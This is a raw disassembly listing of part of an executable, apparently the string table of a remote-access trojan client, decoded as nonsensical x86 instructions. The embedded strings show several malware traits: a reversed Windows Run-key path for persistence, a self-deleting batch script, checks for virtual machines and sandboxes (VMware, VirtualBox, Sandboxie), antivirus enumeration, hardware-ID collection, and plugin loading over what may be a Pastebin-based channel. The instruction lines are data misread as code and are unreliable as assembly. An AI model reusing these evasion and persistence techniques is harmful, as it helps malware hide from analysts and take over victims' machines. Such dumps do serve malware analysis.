  407495:	00 00                	add    %al,(%eax)
  407497:	11 22                	adc    %esp,(%edx)
  407499:	00 20                	add    %ah,(%eax)
  40749b:	00 2f                	add    %ch,(%edi)
  40749d:	00 74 00 72          	add    %dh,0x72(%eax,%eax,1)
  4074a1:	00 20                	add    %ah,(%eax)
  4074a3:	00 27                	add    %ah,(%edi)
  4074a5:	00 22                	add    %ah,(%edx)
  4074a7:	00 01                	add    %al,(%ecx)
  4074a9:	13 22                	adc    (%edx),%esp
  4074ab:	00 27                	add    %ah,(%edi)
  4074ad:	00 20                	add    %ah,(%eax)
  4074af:	00 26                	add    %ah,(%esi)
  4074b1:	00 20                	add    %ah,(%eax)
  4074b3:	00 65 00             	add    %ah,0x0(%ebp)
  4074b6:	78 00                	js     0x4074b8
  4074b8:	69 00 74 00 01 5d    	imul   $0x5d010074,(%eax),%eax
  4074be:	5c                   	pop    %esp
  4074bf:	00 6e 00             	add    %ch,0x0(%esi)
  4074c2:	75 00                	jne    0x4074c4
  4074c4:	52                   	push   %edx
  4074c5:	00 5c 00 6e          	add    %bl,0x6e(%eax,%eax,1)
  4074c9:	00 6f 00             	add    %ch,0x0(%edi)
  4074cc:	69 00 73 00 72 00    	imul   $0x720073,(%eax),%eax
  4074d2:	65 00 56 00          	add    %dl,%gs:0x0(%esi)
  4074d6:	74 00                	je     0x4074d8
  4074d8:	6e                   	outsb  %ds:(%esi),(%dx)
  4074d9:	00 65 00             	add    %ah,0x0(%ebp)
  4074dc:	72 00                	jb     0x4074de
  4074de:	72 00                	jb     0x4074e0
  4074e0:	75 00                	jne    0x4074e2
  4074e2:	43                   	inc    %ebx
  4074e3:	00 5c 00 73          	add    %bl,0x73(%eax,%eax,1)
  4074e7:	00 77 00             	add    %dh,0x0(%edi)
  4074ea:	6f                   	outsl  %ds:(%esi),(%dx)
  4074eb:	00 64 00 6e          	add    %ah,0x6e(%eax,%eax,1)
  4074ef:	00 69 00             	add    %ch,0x0(%ecx)
  4074f2:	57                   	push   %edi
  4074f3:	00 5c 00 74          	add    %bl,0x74(%eax,%eax,1)
  4074f7:	00 66 00             	add    %ah,0x0(%esi)
  4074fa:	6f                   	outsl  %ds:(%esi),(%dx)
  4074fb:	00 73 00             	add    %dh,0x0(%ebx)
  4074fe:	6f                   	outsl  %ds:(%esi),(%dx)
  4074ff:	00 72 00             	add    %dh,0x0(%edx)
  407502:	63 00                	arpl   %eax,(%eax)
  407504:	69 00 4d 00 5c 00    	imul   $0x5c004d,(%eax),%eax
  40750a:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40750e:	61                   	popa
  40750f:	00 77 00             	add    %dh,0x0(%edi)
  407512:	74 00                	je     0x407514
  407514:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  407518:	53                   	push   %ebx
  407519:	00 00                	add    %al,(%eax)
  40751b:	03 22                	add    (%edx),%esp
  40751d:	00 00                	add    %al,(%eax)
  40751f:	09 2e                	or     %ebp,(%esi)
  407521:	00 62 00             	add    %ah,0x0(%edx)
  407524:	61                   	popa
  407525:	00 74 00 00          	add    %dh,0x0(%eax,%eax,1)
  407529:	13 40 00             	adc    0x0(%eax),%eax
  40752c:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  407530:	68 00 6f 00 20       	push   $0x20006f00
  407535:	00 6f 00             	add    %ch,0x0(%edi)
  407538:	66 00 66 00          	data16 add %ah,0x0(%esi)
  40753c:	00 1f                	add    %bl,(%edi)
  40753e:	74 00                	je     0x407540
  407540:	69 00 6d 00 65 00    	imul   $0x65006d,(%eax),%eax
  407546:	6f                   	outsl  %ds:(%esi),(%dx)
  407547:	00 75 00             	add    %dh,0x0(%ebp)
  40754a:	74 00                	je     0x40754c
  40754c:	20 00                	and    %al,(%eax)
  40754e:	33 00                	xor    (%eax),%eax
  407550:	20 00                	and    %al,(%eax)
  407552:	3e 00 20             	add    %ah,%ds:(%eax)
  407555:	00 4e 00             	add    %cl,0x0(%esi)
  407558:	55                   	push   %ebp
  407559:	00 4c 00 00          	add    %cl,0x0(%eax,%eax,1)
  40755d:	15 53 00 54 00       	adc    $0x540053,%eax
  407562:	41                   	inc    %ecx
  407563:	00 52 00             	add    %dl,0x0(%edx)
  407566:	54                   	push   %esp
  407567:	00 20                	add    %ah,(%eax)
  407569:	00 22                	add    %ah,(%edx)
  40756b:	00 22                	add    %ah,(%edx)
  40756d:	00 20                	add    %ah,(%eax)
  40756f:	00 22                	add    %ah,(%edx)
  407571:	00 00                	add    %al,(%eax)
  407573:	07                   	pop    %es
  407574:	43                   	inc    %ebx
  407575:	00 44 00 20          	add    %al,0x20(%eax,%eax,1)
  407579:	00 00                	add    %al,(%eax)
  40757b:	0b 44 00 45          	or     0x45(%eax,%eax,1),%eax
  40757f:	00 4c 00 20          	add    %cl,0x20(%eax,%eax,1)
  407583:	00 22                	add    %ah,(%edx)
  407585:	00 00                	add    %al,(%eax)
  407587:	0f 22 00             	mov    %eax,%cr0
  40758a:	20 00                	and    %al,(%eax)
  40758c:	2f                   	das
  40758d:	00 66 00             	add    %ah,0x0(%esi)
  407590:	20 00                	and    %al,(%eax)
  407592:	2f                   	das
  407593:	00 71 00             	add    %dh,0x0(%ecx)
  407596:	00 23                	add    %ah,(%ebx)
  407598:	49                   	dec    %ecx
  407599:	00 6e 00             	add    %ch,0x0(%esi)
  40759c:	73 00                	jae    0x40759e
  40759e:	74 00                	je     0x4075a0
  4075a0:	61                   	popa
  4075a1:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  4075a5:	00 20                	add    %ah,(%eax)
  4075a7:	00 46 00             	add    %al,0x0(%esi)
  4075aa:	61                   	popa
  4075ab:	00 69 00             	add    %ch,0x0(%ecx)
  4075ae:	6c                   	insb   (%dx),%es:(%edi)
  4075af:	00 65 00             	add    %ah,0x0(%ebp)
  4075b2:	64 00 20             	add    %ah,%fs:(%eax)
  4075b5:	00 3a                	add    %bh,(%edx)
  4075b7:	00 20                	add    %ah,(%eax)
  4075b9:	00 00                	add    %al,(%eax)
  4075bb:	05 78 00 70 00       	add    $0x700078,%eax
  4075c0:	00 45 53             	add    %al,0x53(%ebp)
  4075c3:	00 65 00             	add    %ah,0x0(%ebp)
  4075c6:	6c                   	insb   (%dx),%es:(%edi)
  4075c7:	00 65 00             	add    %ah,0x0(%ebp)
  4075ca:	63 00                	arpl   %eax,(%eax)
  4075cc:	74 00                	je     0x4075ce
  4075ce:	20 00                	and    %al,(%eax)
  4075d0:	2a 00                	sub    (%eax),%al
  4075d2:	20 00                	and    %al,(%eax)
  4075d4:	66 00 72 00          	data16 add %dh,0x0(%edx)
  4075d8:	6f                   	outsl  %ds:(%esi),(%dx)
  4075d9:	00 6d 00             	add    %ch,0x0(%ebp)
  4075dc:	20 00                	and    %al,(%eax)
  4075de:	57                   	push   %edi
  4075df:	00 69 00             	add    %ch,0x0(%ecx)
  4075e2:	6e                   	outsb  %ds:(%esi),(%dx)
  4075e3:	00 33                	add    %dh,(%ebx)
  4075e5:	00 32                	add    %dh,(%edx)
  4075e7:	00 5f 00             	add    %bl,0x0(%edi)
  4075ea:	43                   	inc    %ebx
  4075eb:	00 6f 00             	add    %ch,0x0(%edi)
  4075ee:	6d                   	insl   (%dx),%es:(%edi)
  4075ef:	00 70 00             	add    %dh,0x0(%eax)
  4075f2:	75 00                	jne    0x4075f4
  4075f4:	74 00                	je     0x4075f6
  4075f6:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  4075fa:	53                   	push   %ebx
  4075fb:	00 79 00             	add    %bh,0x0(%ecx)
  4075fe:	73 00                	jae    0x407600
  407600:	74 00                	je     0x407602
  407602:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  407606:	00 19                	add    %bl,(%ecx)
  407608:	4d                   	dec    %ebp
  407609:	00 61 00             	add    %ah,0x0(%ecx)
  40760c:	6e                   	outsb  %ds:(%esi),(%dx)
  40760d:	00 75 00             	add    %dh,0x0(%ebp)
  407610:	66 00 61 00          	data16 add %ah,0x0(%ecx)
  407614:	63 00                	arpl   %eax,(%eax)
  407616:	74 00                	je     0x407618
  407618:	75 00                	jne    0x40761a
  40761a:	72 00                	jb     0x40761c
  40761c:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  407620:	00 2b                	add    %ch,(%ebx)
  407622:	6d                   	insl   (%dx),%es:(%edi)
  407623:	00 69 00             	add    %ch,0x0(%ecx)
  407626:	63 00                	arpl   %eax,(%eax)
  407628:	72 00                	jb     0x40762a
  40762a:	6f                   	outsl  %ds:(%esi),(%dx)
  40762b:	00 73 00             	add    %dh,0x0(%ebx)
  40762e:	6f                   	outsl  %ds:(%esi),(%dx)
  40762f:	00 66 00             	add    %ah,0x0(%esi)
  407632:	74 00                	je     0x407634
  407634:	20 00                	and    %al,(%eax)
  407636:	63 00                	arpl   %eax,(%eax)
  407638:	6f                   	outsl  %ds:(%esi),(%dx)
  407639:	00 72 00             	add    %dh,0x0(%edx)
  40763c:	70 00                	jo     0x40763e
  40763e:	6f                   	outsl  %ds:(%esi),(%dx)
  40763f:	00 72 00             	add    %dh,0x0(%edx)
  407642:	61                   	popa
  407643:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  407647:	00 6f 00             	add    %ch,0x0(%edi)
  40764a:	6e                   	outsb  %ds:(%esi),(%dx)
  40764b:	00 00                	add    %al,(%eax)
  40764d:	0b 4d 00             	or     0x0(%ebp),%ecx
  407650:	6f                   	outsl  %ds:(%esi),(%dx)
  407651:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  407655:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
  407659:	0f 56 00             	orps   (%eax),%xmm0
  40765c:	49                   	dec    %ecx
  40765d:	00 52 00             	add    %dl,0x0(%edx)
  407660:	54                   	push   %esp
  407661:	00 55 00             	add    %dl,0x0(%ebp)
  407664:	41                   	inc    %ecx
  407665:	00 4c 00 00          	add    %cl,0x0(%eax,%eax,1)
  407669:	0d 76 00 6d 00       	or     $0x6d0076,%eax
  40766e:	77 00                	ja     0x407670
  407670:	61                   	popa
  407671:	00 72 00             	add    %dh,0x0(%edx)
  407674:	65 00 00             	add    %al,%gs:(%eax)
  407677:	15 56 00 69 00       	adc    $0x690056,%eax
  40767c:	72 00                	jb     0x40767e
  40767e:	74 00                	je     0x407680
  407680:	75 00                	jne    0x407682
  407682:	61                   	popa
  407683:	00 6c 00 42          	add    %ch,0x42(%eax,%eax,1)
  407687:	00 6f 00             	add    %ch,0x0(%edi)
  40768a:	78 00                	js     0x40768c
  40768c:	00 17                	add    %dl,(%edi)
  40768e:	53                   	push   %ebx
  40768f:	00 62 00             	add    %ah,0x0(%edx)
  407692:	69 00 65 00 44 00    	imul   $0x440065,(%eax),%eax
  407698:	6c                   	insb   (%dx),%es:(%edi)
  407699:	00 6c 00 2e          	add    %ch,0x2e(%eax,%eax,1)
  40769d:	00 64 00 6c          	add    %ah,0x6c(%eax,%eax,1)
  4076a1:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
  4076a5:	11 45 00             	adc    %eax,0x0(%ebp)
  4076a8:	72 00                	jb     0x4076aa
  4076aa:	72 00                	jb     0x4076ac
  4076ac:	20 00                	and    %al,(%eax)
  4076ae:	48                   	dec    %eax
  4076af:	00 57 00             	add    %dl,0x0(%edi)
  4076b2:	49                   	dec    %ecx
  4076b3:	00 44 00 00          	add    %al,0x0(%eax,%eax,1)
  4076b7:	05 78 00 32 00       	add    $0x320078,%eax
  4076bc:	00 15 43 00 6c 00    	add    %dl,0x6c0043
  4076c2:	69 00 65 00 6e 00    	imul   $0x6e0065,(%eax),%eax
  4076c8:	74 00                	je     0x4076ca
  4076ca:	49                   	dec    %ecx
  4076cb:	00 6e 00             	add    %ch,0x0(%esi)
  4076ce:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  4076d2:	00 09                	add    %cl,(%ecx)
  4076d4:	48                   	dec    %eax
  4076d5:	00 57 00             	add    %dl,0x0(%edi)
  4076d8:	49                   	dec    %ecx
  4076d9:	00 44 00 00          	add    %al,0x0(%eax,%eax,1)
  4076dd:	09 55 00             	or     %edx,0x0(%ebp)
  4076e0:	73 00                	jae    0x4076e2
  4076e2:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  4076e6:	00 05 4f 00 53 00    	add    %al,0x53004f
  4076ec:	00 13                	add    %dl,(%ebx)
  4076ee:	4d                   	dec    %ebp
  4076ef:	00 69 00             	add    %ch,0x0(%ecx)
  4076f2:	63 00                	arpl   %eax,(%eax)
  4076f4:	72 00                	jb     0x4076f6
  4076f6:	6f                   	outsl  %ds:(%esi),(%dx)
  4076f7:	00 73 00             	add    %dh,0x0(%ebx)
  4076fa:	6f                   	outsl  %ds:(%esi),(%dx)
  4076fb:	00 66 00             	add    %ah,0x0(%esi)
  4076fe:	74 00                	je     0x407700
  407700:	00 03                	add    %al,(%ebx)
  407702:	20 00                	and    %al,(%eax)
  407704:	00 09                	add    %cl,(%ecx)
  407706:	54                   	push   %esp
  407707:	00 72 00             	add    %dh,0x0(%edx)
  40770a:	75 00                	jne    0x40770c
  40770c:	65 00 00             	add    %al,%gs:(%eax)
  40770f:	0b 36                	or     (%esi),%esi
  407711:	00 34 00             	add    %dh,(%eax,%eax,1)
  407714:	62 00                	bound  %eax,(%eax)
  407716:	69 00 74 00 00 0b    	imul   $0xb000074,(%eax),%eax
  40771c:	46                   	inc    %esi
  40771d:	00 61 00             	add    %ah,0x0(%ecx)
  407720:	6c                   	insb   (%dx),%es:(%edi)
  407721:	00 73 00             	add    %dh,0x0(%ebx)
  407724:	65 00 00             	add    %al,%gs:(%eax)
  407727:	0b 33                	or     (%ebx),%esi
  407729:	00 32                	add    %dh,(%edx)
  40772b:	00 62 00             	add    %ah,0x0(%edx)
  40772e:	69 00 74 00 00 09    	imul   $0x9000074,(%eax),%eax
  407734:	50                   	push   %eax
  407735:	00 61 00             	add    %ah,0x0(%ecx)
  407738:	74 00                	je     0x40773a
  40773a:	68 00 00 0f 56       	push   $0x560f0000
  40773f:	00 65 00             	add    %ah,0x0(%ebp)
  407742:	72 00                	jb     0x407744
  407744:	73 00                	jae    0x407746
  407746:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  40774c:	00 0b                	add    %cl,(%ebx)
  40774e:	41                   	inc    %ecx
  40774f:	00 64 00 6d          	add    %ah,0x6d(%eax,%eax,1)
  407753:	00 69 00             	add    %ch,0x0(%ecx)
  407756:	6e                   	outsb  %ds:(%esi),(%dx)
  407757:	00 00                	add    %al,(%eax)
  407759:	09 74 00 72          	or     %esi,0x72(%eax,%eax,1)
  40775d:	00 75 00             	add    %dh,0x0(%ebp)
  407760:	65 00 00             	add    %al,%gs:(%eax)
  407763:	17                   	pop    %ss
  407764:	50                   	push   %eax
  407765:	00 65 00             	add    %ah,0x0(%ebp)
  407768:	72 00                	jb     0x40776a
  40776a:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  40776e:	72 00                	jb     0x407770
  407770:	6d                   	insl   (%dx),%es:(%edi)
  407771:	00 61 00             	add    %ah,0x0(%ecx)
  407774:	6e                   	outsb  %ds:(%esi),(%dx)
  407775:	00 63 00             	add    %ah,0x0(%ebx)
  407778:	65 00 00             	add    %al,%gs:(%eax)
  40777b:	11 50 00             	adc    %edx,0x0(%eax)
  40777e:	61                   	popa
  40777f:	00 73 00             	add    %dh,0x0(%ebx)
  407782:	74 00                	je     0x407784
  407784:	65 00 62 00          	add    %ah,%gs:0x0(%edx)
  407788:	69 00 6e 00 00 13    	imul   $0x1300006e,(%eax),%eax
  40778e:	41                   	inc    %ecx
  40778f:	00 6e 00             	add    %ch,0x0(%esi)
  407792:	74 00                	je     0x407794
  407794:	69 00 76 00 69 00    	imul   $0x690076,(%eax),%eax
  40779a:	72 00                	jb     0x40779c
  40779c:	75 00                	jne    0x40779e
  40779e:	73 00                	jae    0x4077a0
  4077a0:	00 13                	add    %dl,(%ebx)
  4077a2:	49                   	dec    %ecx
  4077a3:	00 6e 00             	add    %ch,0x0(%esi)
  4077a6:	73 00                	jae    0x4077a8
  4077a8:	74 00                	je     0x4077aa
  4077aa:	61                   	popa
  4077ab:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  4077af:	00 65 00             	add    %ah,0x0(%ebp)
  4077b2:	64 00 00             	add    %al,%fs:(%eax)
  4077b5:	09 50 00             	or     %edx,0x0(%eax)
  4077b8:	6f                   	outsl  %ds:(%esi),(%dx)
  4077b9:	00 6e 00             	add    %ch,0x0(%esi)
  4077bc:	67 00 00             	add    %al,(%bx,%si)
  4077bf:	0b 47 00             	or     0x0(%edi),%eax
  4077c2:	72 00                	jb     0x4077c4
  4077c4:	6f                   	outsl  %ds:(%esi),(%dx)
  4077c5:	00 75 00             	add    %dh,0x0(%ebp)
  4077c8:	70 00                	jo     0x4077ca
  4077ca:	00 05 5c 00 5c 00    	add    %al,0x5c005c
  4077d0:	00 2b                	add    %ch,(%ebx)
  4077d2:	5c                   	pop    %esp
  4077d3:	00 72 00             	add    %dh,0x0(%edx)
  4077d6:	6f                   	outsl  %ds:(%esi),(%dx)
  4077d7:	00 6f 00             	add    %ch,0x0(%edi)
  4077da:	74 00                	je     0x4077dc
  4077dc:	5c                   	pop    %esp
  4077dd:	00 53 00             	add    %dl,0x0(%ebx)
  4077e0:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  4077e4:	75 00                	jne    0x4077e6
  4077e6:	72 00                	jb     0x4077e8
  4077e8:	69 00 74 00 79 00    	imul   $0x790074,(%eax),%eax
  4077ee:	43                   	inc    %ebx
  4077ef:	00 65 00             	add    %ah,0x0(%ebp)
  4077f2:	6e                   	outsb  %ds:(%esi),(%dx)
  4077f3:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  4077f7:	00 72 00             	add    %dh,0x0(%edx)
  4077fa:	32 00                	xor    (%eax),%al
  4077fc:	00 3d 53 00 65 00    	add    %bh,0x650053
  407802:	6c                   	insb   (%dx),%es:(%edi)
  407803:	00 65 00             	add    %ah,0x0(%ebp)
  407806:	63 00                	arpl   %eax,(%eax)
  407808:	74 00                	je     0x40780a
  40780a:	20 00                	and    %al,(%eax)
  40780c:	2a 00                	sub    (%eax),%al
  40780e:	20 00                	and    %al,(%eax)
  407810:	66 00 72 00          	data16 add %dh,0x0(%edx)
  407814:	6f                   	outsl  %ds:(%esi),(%dx)
  407815:	00 6d 00             	add    %ch,0x0(%ebp)
  407818:	20 00                	and    %al,(%eax)
  40781a:	41                   	inc    %ecx
  40781b:	00 6e 00             	add    %ch,0x0(%esi)
  40781e:	74 00                	je     0x407820
  407820:	69 00 76 00 69 00    	imul   $0x690076,(%eax),%eax
  407826:	72 00                	jb     0x407828
  407828:	75 00                	jne    0x40782a
  40782a:	73 00                	jae    0x40782c
  40782c:	50                   	push   %eax
  40782d:	00 72 00             	add    %dh,0x0(%edx)
  407830:	6f                   	outsl  %ds:(%esi),(%dx)
  407831:	00 64 00 75          	add    %ah,0x75(%eax,%eax,1)
  407835:	00 63 00             	add    %ah,0x0(%ebx)
  407838:	74 00                	je     0x40783a
  40783a:	00 17                	add    %dl,(%edi)
  40783c:	64 00 69 00          	add    %ch,%fs:0x0(%ecx)
  407840:	73 00                	jae    0x407842
  407842:	70 00                	jo     0x407844
  407844:	6c                   	insb   (%dx),%es:(%edi)
  407845:	00 61 00             	add    %ah,0x0(%ecx)
  407848:	79 00                	jns    0x40784a
  40784a:	4e                   	dec    %esi
  40784b:	00 61 00             	add    %ah,0x0(%ecx)
  40784e:	6d                   	insl   (%dx),%es:(%edi)
  40784f:	00 65 00             	add    %ah,0x0(%ebp)
  407852:	00 07                	add    %al,(%edi)
  407854:	4e                   	dec    %esi
  407855:	00 2f                	add    %ch,(%edi)
  407857:	00 41 00             	add    %al,0x0(%ecx)
  40785a:	00 05 2c 00 20 00    	add    %al,0x20002c
  407860:	00 13                	add    %dl,(%ebx)
  407862:	53                   	push   %ebx
  407863:	00 6f 00             	add    %ch,0x0(%edi)
  407866:	66 00 74 00 77       	data16 add %dh,0x77(%eax,%eax,1)
  40786b:	00 61 00             	add    %ah,0x0(%ecx)
  40786e:	72 00                	jb     0x407870
  407870:	65 00 5c 00 00       	add    %bl,%gs:0x0(%eax,%eax,1)
  407875:	09 70 00             	or     %esi,0x0(%eax)
  407878:	6f                   	outsl  %ds:(%esi),(%dx)
  407879:	00 6e 00             	add    %ch,0x0(%esi)
  40787c:	67 00 00             	add    %al,(%bx,%si)
  40787f:	0d 70 00 6c 00       	or     $0x6c0070,%eax
  407884:	75 00                	jne    0x407886
  407886:	67 00 69 00          	add    %ch,0x0(%bx,%di)
  40788a:	6e                   	outsb  %ds:(%esi),(%dx)
  40788b:	00 00                	add    %al,(%eax)
  40788d:	15 73 00 61 00       	adc    $0x610073,%eax
  407892:	76 00                	jbe    0x407894
  407894:	65 00 50 00          	add    %dl,%gs:0x0(%eax)
  407898:	6c                   	insb   (%dx),%es:(%edi)
  407899:	00 75 00             	add    %dh,0x0(%ebp)
  40789c:	67 00 69 00          	add    %ch,0x0(%bx,%di)
  4078a0:	6e                   	outsb  %ds:(%esi),(%dx)
  4078a1:	00 00                	add    %al,(%eax)
  4078a3:	07                   	pop    %es
  4078a4:	44                   	inc    %esp
  4078a5:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  4078a9:	00 00                	add    %al,(%eax)
  4078ab:	15 73 00 65 00       	adc    $0x650073,%eax
  4078b0:	6e                   	outsb  %ds:(%esi),(%dx)
  4078b1:	00 64 00 50          	add    %ah,0x50(%eax,%eax,1)
  4078b5:	00 6c 00 75          	add    %ch,0x75(%eax,%eax,1)
  4078b9:	00 67 00             	add    %ah,0x0(%edi)
  4078bc:	69 00 6e 00 00 0d    	imul   $0xd00006e,(%eax),%eax
  4078c2:	48                   	dec    %eax
  4078c3:	00 61 00             	add    %ah,0x0(%ecx)
  4078c6:	73 00                	jae    0x4078c8
  4078c8:	68 00 65 00 73       	push   $0x73006500
  4078cd:	00 00                	add    %al,(%eax)
  4078cf:	09 48 00             	or     %ecx,0x0(%eax)
  4078d2:	61                   	popa
  4078d3:	00 73 00             	add    %dh,0x0(%ebx)
  4078d6:	68 00 00 19 70       	push   $0x70190000
  4078db:	00 6c 00 75          	add    %ch,0x75(%eax,%eax,1)
  4078df:	00 67 00             	add    %ah,0x0(%edi)
  4078e2:	69 00 6e 00 20 00    	imul   $0x20006e,(%eax),%eax
  4078e8:	73 00                	jae    0x4078ea
  4078ea:	61                   	popa
  4078eb:	00 76 00             	add    %dh,0x0(%esi)
  4078ee:	65 00 64 00 00       	add    %ah,%gs:0x0(%eax,%eax,1)
  4078f3:	1b 50 00             	sbb    0x0(%eax),%edx
  4078f6:	6c                   	insb   (%dx),%es:(%edi)
  4078f7:	00 75 00             	add    %dh,0x0(%ebp)
  4078fa:	67 00 69 00          	add    %ch,0x0(%bx,%di)
  4078fe:	6e                   	outsb  %ds:(%esi),(%dx)
  4078ff:	00 2e                	add    %ch,(%esi)
  407901:	00 50 00             	add    %dl,0x0(%eax)
  407904:	6c                   	insb   (%dx),%es:(%edi)
  407905:	00 75 00             	add    %dh,0x0(%ebp)
  407908:	67 00 69 00          	add    %ch,0x0(%bx,%di)
  40790c:	6e                   	outsb  %ds:(%esi),(%dx)
  40790d:	00 00                	add    %al,(%eax)
  40790f:	07                   	pop    %es
  407910:	52                   	push   %edx
  407911:	00 75 00             	add    %dh,0x0(%ebp)
  407914:	6e                   	outsb  %ds:(%esi),(%dx)
  407915:	00 00                	add    %al,(%eax)
  407917:	0f 4d 00             	cmovge (%eax),%eax
  40791a:	73 00                	jae    0x40791c
  40791c:	67 00 70 00          	add    %dh,0x0(%bx,%si)
  407920:	61                   	popa
  407921:	00 63 00             	add    %ah,0x0(%ebx)
  407924:	6b 00 00             	imul   $0x0,(%eax),%eax
  407927:	11 52 00             	adc    %edx,0x0(%edx)
  40792a:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40792e:	65 00 69 00          	add    %ch,%gs:0x0(%ecx)
  407932:	76 00                	jbe    0x407934
  407934:	65 00 64 00 00       	add    %ah,%gs:0x0(%eax,%eax,1)
  407939:	0b 45 00             	or     0x0(%ebp),%eax
  40793c:	72 00                	jb     0x40793e
  40793e:	72 00                	jb     0x407940
  407940:	6f                   	outsl  %ds:(%esi),(%dx)
  407941:	00 72 00             	add    %dh,0x0(%edx)
  407944:	00 47 6d             	add    %al,0x6d(%edi)
  407947:	00 61 00             	add    %ah,0x0(%ecx)
  40794a:	73 00                	jae    0x40794c
  40794c:	74 00                	je     0x40794e
  40794e:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  407952:	4b                   	dec    %ebx
  407953:	00 65 00             	add    %ah,0x0(%ebp)
  407956:	79 00                	jns    0x407958
  407958:	20 00                	and    %al,(%eax)
  40795a:	63 00                	arpl   %eax,(%eax)
  40795c:	61                   	popa
  40795d:	00 6e 00             	add    %ch,0x0(%esi)
  407960:	20 00                	and    %al,(%eax)
  407962:	6e                   	outsb  %ds:(%esi),(%dx)
  407963:	00 6f 00             	add    %ch,0x0(%edi)
  407966:	74 00                	je     0x407968
  407968:	20 00                	and    %al,(%eax)
  40796a:	62 00                	bound  %eax,(%eax)
  40796c:	65 00 20             	add    %ah,%gs:(%eax)
  40796f:	00 6e 00             	add    %ch,0x0(%esi)
  407972:	75 00                	jne    0x407974
  407974:	6c                   	insb   (%dx),%es:(%edi)
  407975:	00 6c 00 20          	add    %ch,0x20(%eax,%eax,1)
  407979:	00 6f 00             	add    %ch,0x0(%edi)
  40797c:	72 00                	jb     0x40797e
  40797e:	20 00                	and    %al,(%eax)
  407980:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  407984:	70 00                	jo     0x407986
  407986:	74 00                	je     0x407988
  407988:	79 00                	jns    0x40798a
  40798a:	2e 00 00             	add    %al,%cs:(%eax)
  40798d:	2d 69 00 6e 00       	sub    $0x6e0069,%eax
  407992:	70 00                	jo     0x407994
  407994:	75 00                	jne    0x407996
  407996:	74 00                	je     0x407998
  407998:	20 00                	and    %al,(%eax)
  40799a:	63 00                	arpl   %eax,(%eax)
  40799c:	61                   	popa
  40799d:	00 6e 00             	add    %ch,0x0(%esi)
  4079a0:	20 00                	and    %al,(%eax)
  4079a2:	6e                   	outsb  %ds:(%esi),(%dx)
  4079a3:	00 6f 00             	add    %ch,0x0(%edi)
  4079a6:	74 00                	je     0x4079a8
  4079a8:	20 00                	and    %al,(%eax)
  4079aa:	62 00                	bound  %eax,(%eax)
  4079ac:	65 00 20             	add    %ah,%gs:(%eax)
  4079af:	00 6e 00             	add    %ch,0x0(%esi)
  4079b2:	75 00                	jne    0x4079b4
  4079b4:	6c                   	insb   (%dx),%es:(%edi)
  4079b5:	00 6c 00 2e          	add    %ch,0x2e(%eax,%eax,1)
  4079b9:	00 00                	add    %al,(%eax)
  4079bb:	55                   	push   %ebp
  4079bc:	49                   	dec    %ecx
  4079bd:	00 6e 00             	add    %ch,0x0(%esi)
  4079c0:	76 00                	jbe    0x4079c2
  4079c2:	61                   	popa
  4079c3:	00 6c 00 69          	add    %ch,0x69(%eax,%eax,1)
  4079c7:	00 64 00 20          	add    %ah,0x20(%eax,%eax,1)
  4079cb:	00 6d 00             	add    %ch,0x0(%ebp)
  4079ce:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  4079d2:	73 00                	jae    0x4079d4
  4079d4:	61                   	popa
  4079d5:	00 67 00             	add    %ah,0x0(%edi)
  4079d8:	65 00 20             	add    %ah,%gs:(%eax)
  4079db:	00 61 00             	add    %ah,0x0(%ecx)
  4079de:	75 00                	jne    0x4079e0
  4079e0:	74 00                	je     0x4079e2
  4079e2:	68 00 65 00 6e       	push   $0x6e006500
  4079e7:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  4079eb:	00 63 00             	add    %ah,0x0(%ebx)
  4079ee:	61                   	popa
  4079ef:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  4079f3:	00 6f 00             	add    %ch,0x0(%edi)
  4079f6:	6e                   	outsb  %ds:(%esi),(%dx)
  4079f7:	00 20                	add    %ah,(%eax)
  4079f9:	00 63 00             	add    %ah,0x0(%ebx)
  4079fc:	6f                   	outsl  %ds:(%esi),(%dx)
  4079fd:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  407a01:	00 20                	add    %ah,(%eax)
  407a03:	00 28                	add    %ch,(%eax)
  407a05:	00 4d 00             	add    %cl,0x0(%ebp)
  407a08:	41                   	inc    %ecx
  407a09:	00 43 00             	add    %al,0x0(%ebx)
  407a0c:	29 00                	sub    %eax,(%eax)
  407a0e:	2e 00 00             	add    %al,%cs:(%eax)
  407a11:	05 58 00 32 00       	add    $0x320058,%eax
  407a16:	00 00                	add    %al,(%eax)
  407a18:	95                   	xchg   %eax,%ebp
  407a19:	18 f6                	sbb    %dh,%dh
  407a1b:	95                   	xchg   %eax,%ebp
  407a1c:	c8 86 d0 4c          	enter  $0xd086,$0x4c
  407a20:	b4 a0                	mov    $0xa0,%ah
  407a22:	01 d6                	add    %edx,%esi
  407a24:	62                   	(bad)
  407a25:	f0 2a 6c 00 04       	lock sub 0x4(%eax,%eax,1),%ch
  407a2a:	20 01                	and    %al,(%ecx)
  407a2c:	01 08                	add    %ecx,(%eax)
  407a2e:	03 20                	add    (%eax),%esp
  407a30:	00 01                	add    %al,(%ecx)
  407a32:	05 20 01 01 11       	add    $0x11010120,%eax
  407a37:	11 04 20             	adc    %eax,(%eax,%eiz,1)
  407a3a:	01 01                	add    %eax,(%ecx)
  407a3c:	0e                   	push   %cs
  407a3d:	04 20                	add    $0x20,%al
